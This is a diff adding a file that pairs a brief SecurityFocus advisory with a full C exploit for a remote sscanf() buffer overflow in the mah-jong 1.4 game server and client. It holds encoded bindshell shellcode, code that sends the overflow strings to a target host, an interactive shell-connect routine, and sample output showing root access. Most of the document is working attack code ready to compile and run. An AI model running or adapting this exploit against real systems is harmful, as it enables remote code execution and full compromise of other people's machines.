@@ -1,0 +1,339 @@
+source: http://www.securityfocus.com/bid/8557/info
+
+A remote buffer overflow vulnerability when calling the sscanf() function has been reported to affect the mah-jong game client and server programs. The issue occurs within seperate source files, however the code used by both programs is identical. It should be noted that the bug must be triggered using different options depending on whether the target is a client or server.
+
+This vulnerability can be exploited to execute arbitrary code with the privileges of the target client or server application. 
+
+/*[ mah-jong[v1.4]: server/client remote buffer overflow exploit. ]*
+ *                                                                 *
+ * by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo/realhalo)       *
+ *                                                                 *
+ * compile:                                                        *
+ *  cc xmjong.c -o xmjong                                          *
+ *                                                                 *
+ * syntax:                                                         *
+ *  ./xmjong <host|-b> [port] [return address] [offset]            *
+ *                                                                 *
+ * this program exploits the "SetPlayerOption" command of          *
+ * mah-jong's server(mj-server) and the "PlayerOptionSet" command  *
+ * of mah-jong's client(mj-player).  while this is an undiscovered *
+ * bug, the giant all-purpose patch on debian's package site       *
+ * appears to have resolved the issue.  as such, this exploit      *
+ * is applied to CAN-2003-0705.                                    *
+ *                                                                 *
+ * the overflow itself occurs do to an unchecked sscanf() call to  *
+ * write to little_buffer[32].  the situation is rather odd do to  *
+ * the repetitive nature of dec_pmsg.c/dec_cmsg.c using sscanf()   *
+ * to write to little_buffer[32] properly, with limitation         *
+ * restrictions, the other 13 times.  the "SetPlayerOption" and    *
+ * "PlayerOptionSet" command apparently slipped by.                *
+ *                                                                 *
+ * the original plan to exploit this bug was by placing the        *
+ * shellcode after the overflow itself, in the same                *
+ * little_buffer[32](shellcode on the stack) location.  however,   *
+ * there happens to not be very much on the stack, so you start    *
+ * running into environmental variables quickly.  this is too      *
+ * dependent on the environment size, and will often run out of    *
+ * bounds on small environments(ie. 0xc0000000 on linux).          *
+ *                                                                 *
+ * so, instead the shellcode is being placed on the heap in the    *
+ * "buffer.1" buffer.  this can be found by running "objdump -x    *
+ * mj-?????? | grep buffer.1", where "??????" is "server" or       *
+ * "player", depending on what program is being exploited.  once   *
+ * the "buffer.1" address is found add 512 to it, this is to skip  *
+ * the initial (re-used) junk at the beginning of the buffer.      *
+ *                                                                 *
+ * bug location:                                                   *
+ *  (server-side; dec_pmsg.c)                                      *
+ *   316:if ( strcmp(type,"SetPlayerOption") == 0 ) {              *
+ *   ...                                                           *
+ *   324:if ( sscanf(s,"%s %n",little_string,&n) ==0 ) { warn("pr$ *
+ *  (client-side; dec_cmsg.c)                                      *
+ *   876:if ( strcmp(type,"PlayerOptionSet") == 0 ) {              *
+ *   ...                                                           *
+ *   884:if ( sscanf(s,"%s %n",little_string,&n) ==0 ) { warn("pr$ *
+ *                                                                 *
+ * fix:                                                            *
+ *  1.4-2 patch, which can be found on debian's package site.      *
+ *                                                                 *
+ * exploit workings(commands sent to the server):                  *
+ *  (server-side)                                                  *
+ *   Connect 1034 0 <shellcode, under 1024 bytes>                  *
+ *   SetPlayerOption <pointer overwrite, >32 byte overflow>        *
+ *  (client-side)                                                  *
+ *   <shellcode, under 1024 bytes>                                 *
+ *   PlayerOptionSet <pointer overwrite, >32 byte overflow>        *
+ *                                                                 *
+ * example usages:                                                 *
+ *  (server-side example usage)                                    *
+ *   # cc xmjong.c -o xmjong                                       *
+ *   # ./xmjong localhost 5000 `objdump -x mj-server|\             *
+ *   > grep buffer.1|awk '{print $1}'` 512                         *
+ *   [*] mah-jong[v1.4]: server/client remote buffer overflow exp$ *
+ *   [*] by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)          *
+ *                                                                 *
+ *   [*] target: localhost:5000, return address(buffer.1+512): 0x$ *
+ *                                                                 *
+ *   [*] attempting to connect: localhost:5000.                    *
+ *   [*] successfully connected: localhost:5000.                   *
+ *   [*] sending the strings to exploit the overflow.              *
+ *   -> Connect 1034 0 ??????????????????????????????????????????$ *
+ *   -> SetPlayerOption ?????????????????????????????????????????$ *
+ *   [*] checking to see if the exploit was successful.            *
+ *   [*] attempting to connect: localhost:45295.                   *
+ *   [*] successfully connected: localhost:45295.                  *
+ *                                                                 *
+ *   Linux localhost.localdomain 2.4.2-2 #1 Sun Apr 8 20:41:30 ED$ *
+ *   uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sy$ *
+ *                                                                 *
+ *  (client-side example usage)                                    *
+ *   # cc xmjong.c -o xmjong                                       *
+ *   # ./xmjong -b 5000 `objdump -x mj-player|grep buffer.1|\      *
+ *   > awk '{print $1}'` 512                                       *
+ *   [*] mah-jong[v1.4]: server/client remote buffer overflow exp$ *
+ *   [*] by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)          *
+ *                                                                 *
+ *   [*] target: *:5000, return address(buffer.1+512): 0x080733a0. *
+ *                                                                 *
+ *   [*] awaiting connection from: *:5000.                         *
+ *   [*] mah-jong server connection established.                   *
+ *   [*] sending the strings to exploit the overflow.              *
+ *   -> ?????????????????????????????????????????????????????????$ *
+ *   -> PlayerOptionSet ?3???3???3???3???3???3???3???3???3???3???$ *
+ *   [*] mah-jong server connection closed.                        *
+ *   [*] checking to see if the exploit was successful.            *
+ *   [*] attempting to connect: 127.0.0.1:45295.                   *
+ *   [*] successfully connected: 127.0.0.1:45295.                  *
+ *                                                                 *
+ *   Linux localhost.localdomain 2.4.2-2 #1 Sun Apr 8 20:41:30 ED$ *
+ *   uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sy$ *
+ *                                                                 *
+ * note:                                                           *
+ *  this isn't a completely standard stack overflow; however       *
+ *  exploitation looks very similar.  as such, standard stack      *
+ *  overflow knowledge is all that is needed to understand this.   *
+ *                                                                 *
+ * (tested on redhat/7.1, squished exploit code as always, also a  *
+ * little loose on the comments this time around)      .,,.        *
+ ************************* ..,,,.. .  .    ..    . .. (v9fh) ..... */
+#include <stdio.h>      /* ;~~     .,;:iil8OO8li:;,,.  `~~'     ~: */
+#include <stdlib.h>     /* :    .i48$$$$$$88O88$$$$$88L.      .  . */
+#include <stdarg.h>     /* .   (8$$$P"^`...,.``~;88$$$$8)    :$:   */
+#include <string.h>     /*    . `l$$bo.``'       `18$$87 .    `  . */
+#include <strings.h>    /* .   .  `t$$8Oo4Oo.   i.. ``., i   ..;.  */
+#include <signal.h>     /* .    )  ,$87~8O7~ .  lii: .:: l     '   */
+#include <unistd.h>     /* i  .'  .487'__-     4$l;  :ii I _---~   */
+#include <ctype.h>      /* l `  .o$87 ..ake  .4$$7., ill I ..alo . */
+#include <netdb.h>      /* I .oO$87'..     .4$$$7':illII $       . */
+#include <sys/socket.h> /* $.`q87' `` .,o4$$$$87   . lI$ $   .     */
+#include <sys/types.h>  /* $Oo.~'      `~t88P~`    i I$$ $       . */
+#include <sys/time.h>   /* `~'     _   _           l $$$ $.... ..: */
+#include <netinet/in.h> /* !filler FakeHalo ascii! ~ ``' ~~~~~~~~~ */
+#include <arpa/inet.h>  /*******************************************/
+#define DFLADDR (0x0807f7a0+512) /* objdump -x mj-?????? | grep buffer.1 */
+#define DFLPORT 5000 /* default port mah-jong server runs on.            */
+#define DFLCLMN 80 /* default column value, if no $COLUMNS is defined.   */
+#define TIMEOUT 10 /* generic alarm() timeout, simple style.             */
+static char x86_exec[]= /* bindshell(45295)&, netric/S-poly.             */
+ "\x57\x5f\xeb\x11\x5e\x31\xc9\xb1\xc8\x80\x44\x0e\xff\x2b\x49\x41\x49\x75"
+ "\xf6\xeb\x05\xe8\xea\xff\xff\xff\x06\x95\x06\xb0\x06\x9e\x26\x86\xdb\x26"
+ "\x86\xd6\x26\x86\xd7\x26\x5e\xb6\x88\xd6\x85\x3b\xa2\x55\x5e\x96\x06\x95"
+ "\x06\xb0\x25\x25\x25\x3b\x3d\x85\xc4\x88\xd7\x3b\x28\x5e\xb7\x88\xe5\x28"
+ "\x88\xd7\x27\x26\x5e\x9f\x5e\xb6\x85\x3b\xa2\x55\x06\xb0\x0e\x98\x49\xda"
+ "\x06\x95\x15\xa2\x55\x06\x95\x25\x27\x5e\xb6\x88\xd9\x85\x3b\xa2\x55\x5e"
+ "\xac\x06\x95\x06\xb0\x06\x9e\x88\xe6\x86\xd6\x85\x05\xa2\x55\x06\x95\x06"
+ "\xb0\x25\x25\x2c\x5e\xb6\x88\xda\x85\x3b\xa2\x55\x5e\x9b\x06\x95\x06\xb0"
+ "\x85\xd7\xa2\x55\x0e\x98\x4a\x15\x06\x95\x5e\xd0\x85\xdb\xa2\x55\x06\x95"
+ "\x06\x9e\x5e\xc8\x85\x14\xa2\x55\x06\x95\x16\x85\x14\xa2\x55\x06\x95\x16"
+ "\x85\x14\xa2\x55\x06\x95\x25\x3d\x04\x04\x48\x3d\x3d\x04\x37\x3e\x43\x5e"
+ "\xb8\x60\x29\xf9\xdd\x25\x28\x5e\xb6\x85\xe0\xa2\x55\x06\x95\x15\xa2\x55"
+ "\x06\x95\x5e\xc8\x85\xdb\xa2\x55\xc0\x6e";
+char *getptr(unsigned int);
+char *getcode(void);
+char *mj_bind(unsigned short,unsigned int);
+unsigned short mj_connect(char *,unsigned short,unsigned int);
+void getshell(char *,unsigned short);
+void filter_text(char *);
+void mj_printf(int,char *,...);
+void printe(char *,short);
+void sig_alarm(){printe("alarm/timeout hit.",1);}
+int main(int argc,char **argv){
+ unsigned short isbind=0,port=DFLPORT;
+ unsigned int ptr=DFLADDR;
+ char *hostptr;
+ printf("[*] mah-jong[v1.4]: server/client remote buffer overflow ex"
+ "ploit.\n[*] by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)\n\n"); 
+ if(argc<2){
+  printf("[!] syntax: %s <host|-b> [port] [return address] [offset]\n",
+  argv[0]);
+  exit(1);
+ }
+ if(!strcmp(argv[1],"-b"))isbind=1;
+ if(argc>2)port=atoi(argv[2]);
+ if(argc>3)sscanf(argv[3],"%x",&ptr);
+ if(argc>4)ptr+=atoi(argv[4]);
+ printf("[*] target: %s:%u, return address(buffer.1+512): 0x%.8x.\n\n",
+ isbind?"*":argv[1],port,ptr);
+ if(isbind)hostptr=mj_bind(port,ptr);
+ else mj_connect((hostptr=argv[1]),port,ptr);
+ sleep(1);
+ getshell(hostptr,45295); /* defined in shellcode. */
+ exit(0);
+}
+char *getptr(unsigned int newptr){
+ unsigned int i=0;
+ char *buf;
+ if(!(buf=(char *)malloc(128+1)))
+  printe("getptr(): allocating memory failed.",1);
+ memset(buf,0x0,128+1);
+ for(i=0;i<128;i+=4){*(long *)&buf[i]=newptr;}
+ return(buf);
+}
+char *getcode(void){
+ char *buf;
+ if(!(buf=(char *)malloc(1000+1)))
+  printe("getcode(): allocating memory failed",1);
+ memset(buf,0x90,(1000-strlen(x86_exec)));
+ memcpy(buf+(1000-strlen(x86_exec)),x86_exec,strlen(x86_exec));
+ return(buf);
+}
+char *mj_bind(unsigned short port,unsigned int newptr){
+ int ssock=0,sock=0,so=1;
+ unsigned int salen=0;
+ struct sockaddr_in ssa,sa;
+ ssock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+ setsockopt(ssock,SOL_SOCKET,SO_REUSEADDR,(void *)&so,sizeof(so));
+#ifdef SO_REUSEPORT
+ setsockopt(ssock,SOL_SOCKET,SO_REUSEPORT,(void *)&so,sizeof(so));
+#endif
+ ssa.sin_family=AF_INET;
+ ssa.sin_port=htons(port);
+ ssa.sin_addr.s_addr=INADDR_ANY;
+ printf("[*] awaiting connection from: *:%d.\n",port);
+ if(bind(ssock,(struct sockaddr *)&ssa,sizeof(ssa))==-1)
+  printe("could not bind socket.",1);
+ listen(ssock,1);
+ bzero((char*)&sa,sizeof(struct sockaddr_in));
+ salen=sizeof(sa);
+ sock=accept(ssock,(struct sockaddr *)&sa,&salen);
+ close(ssock);
+ printf("[*] mah-jong server connection established.\n");
+ printf("[*] sending the strings to exploit the overflow.\n");
+ mj_printf(sock,"%s\n",getcode());
+ mj_printf(sock,"PlayerOptionSet %s\n",getptr(newptr));
+ sleep(1);
+ close(sock);
+ printf("[*] mah-jong server connection closed.\n");
+ return(inet_ntoa(sa.sin_addr));
+}
+unsigned short mj_connect(char *hostname,unsigned short port,
+unsigned int newptr){
+ int sock;
+ struct hostent *t;
+ struct sockaddr_in s;
+ sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+ s.sin_family=AF_INET;
+ s.sin_port=htons(port);
+ printf("[*] attempting to connect: %s:%d.\n",hostname,port);
+ if((s.sin_addr.s_addr=inet_addr(hostname))){
+  if(!(t=gethostbyname(hostname)))
+   printe("couldn't resolve hostname.",1);
+  memcpy((char*)&s.sin_addr,(char*)t->h_addr,sizeof(s.sin_addr));
+ }
+ signal(SIGALRM,sig_alarm);
+ alarm(TIMEOUT);
+ if(connect(sock,(struct sockaddr *)&s,sizeof(s)))
+  printe("mah-jong connection failed.",1);
+ alarm(0);
+ printf("[*] successfully connected: %s:%d.\n",hostname,port);
+ printf("[*] sending the strings to exploit the overflow.\n");
+ mj_printf(sock,"Connect 1034 0 %s\n",getcode());
+ mj_printf(sock,"SetPlayerOption %s\n",getptr(newptr));
+ sleep(1);
+ close(sock);
+ return(0);
+}
+void getshell(char *hostname,unsigned short port){
+ int sock,r;
+ fd_set fds;
+ char buf[4096+1];
+ struct hostent *he;
+ struct sockaddr_in sa;
+ printf("[*] checking to see if the exploit was successful.\n");
+ if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
+  printe("getshell(): socket() failed.",1);
+ sa.sin_family=AF_INET;
+ if((sa.sin_addr.s_addr=inet_addr(hostname))){
+  if(!(he=gethostbyname(hostname)))
+   printe("getshell(): couldn't resolve.",1);
+  memcpy((char *)&sa.sin_addr,(char *)he->h_addr,
+  sizeof(sa.sin_addr));
+ }
+ sa.sin_port=htons(port);
+ signal(SIGALRM,sig_alarm);
+ alarm(TIMEOUT);
+ printf("[*] attempting to connect: %s:%d.\n",hostname,port);
+ if(connect(sock,(struct sockaddr *)&sa,sizeof(sa))){
+  printf("[!] connection failed: %s:%d.\n",hostname,port);
+  return;
+ }
+ alarm(0);
+ printf("[*] successfully connected: %s:%d.\n\n",hostname,port);
+ signal(SIGINT,SIG_IGN);
+ write(sock,"uname -a;id\n",13);
+ while(1){
+  FD_ZERO(&fds);
+  FD_SET(0,&fds);
+  FD_SET(sock,&fds);
+  if(select(sock+1,&fds,0,0,0)<1)
+   printe("getshell(): select() failed.",1);
+  if(FD_ISSET(0,&fds)){
+   if((r=read(0,buf,4096))<1)
+    printe("getshell(): read() failed.",1);
+   if(write(sock,buf,r)!=r)
+    printe("getshell(): write() failed.",1);
+  }
+  if(FD_ISSET(sock,&fds)){
+   if((r=read(sock,buf,4096))<1)exit(0);
+   write(1,buf,r);
+  }
+ }
+ close(sock);
+ return;
+}
+void filter_text(char *ptr){
+ unsigned int i=0,columns=DFLCLMN;
+ if(getenv("COLUMNS"))columns=atoi(getenv("COLUMNS"));
+ if(7>columns||columns>256)columns=DFLCLMN;
+ for(i=0;i<strlen(ptr);i++){
+  if(i>=(columns-3)){
+   ptr[i--]=0x0;
+   ptr[i--]='.';
+   ptr[i--]='.';
+   ptr[i]='.';
+  }
+  else if(ptr[i]=='\r'||ptr[i]=='\n')ptr[i]=0x0;
+  else if(!isprint(ptr[i]))ptr[i]='?';
+ }
+ return;
+}
+void mj_printf(int sock,char *fmt,...){
+ char *buf;
+ va_list ap;
+ if(!(buf=(char *)malloc(1024+1)))
+  printe("mj_printf(): allocating memory failed.",1);
+ memset(buf,0x0,1024+1);
+ va_start(ap,fmt);
+ vsnprintf(buf,1024,fmt,ap);
+ va_end(ap);
+ write(sock,buf,strlen(buf));
+ filter_text(buf);
+ printf("-> %s\n",buf);
+ free(buf);
+ return;
+}
+void printe(char *err,short e){
+ printf("[!] %s\n",err);
+ if(e)exit(1);
+ return;
+}
